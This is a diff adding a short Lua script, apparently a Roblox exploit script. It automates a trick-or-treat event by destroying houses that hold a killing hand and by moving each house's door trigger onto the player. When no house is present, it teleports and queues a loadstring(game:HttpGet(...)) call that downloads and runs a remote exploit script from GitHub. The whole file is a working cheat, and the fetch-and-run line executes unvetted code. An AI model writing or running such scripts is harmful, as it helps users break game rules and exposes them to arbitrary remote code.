@@ -1,0 +1,18 @@
+function getRoot(char) -- find player root part
+	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+	return rootPart
+end
+while wait(1) do 
+    if Workspace.Houses:FindFirstChild("TrickOrTreatHouse") then -- if house even exists
+        if Workspace.Houses:FindFirstChild("TrickOrTreatHouse"):FindFirstChild("GiantHand") then  -- destroy houses that kills
+            Workspace.Houses:FindFirstChild("TrickOrTreatHouse"):Destroy()
+        end
+        if Workspace.Houses:FindFirstChild("TrickOrTreatHouse") then -- tp house door to player
+           Workspace.Houses:FindFirstChild("TrickOrTreatHouse").Door.DoorInnerTouch.CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame
+        end
+    else -- teleport to other place if there's no houses
+        wait(7)
+        game:GetService('TeleportService'):Teleport(537413528)
+        queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+    end
+end
